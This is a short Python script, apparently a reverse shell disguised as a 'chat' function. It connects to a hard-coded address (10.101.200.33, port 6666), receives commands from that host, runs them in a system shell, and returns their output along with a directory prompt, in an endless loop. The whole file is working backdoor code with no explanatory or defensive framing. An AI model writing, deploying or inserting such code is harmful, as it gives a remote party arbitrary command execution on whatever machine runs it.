#coding utf-8

import socket
import sys
import os
import subprocess



def chat (host,port):
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(str(os.getcwd()) + '> ')

    while True:
        retrieveMsg = s.recv(2048)
        sendMsg = subprocess.Popen(retrieveMsg,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        stdout = sendMsg.stdout.read() + sendMsg.stderr.read()
        s.send(stdout + str(os.getcwd()) + '> ')
    s.close()

def main():

    host= "10.101.200.33"
    port= 6666
    chat(host,port)
main()
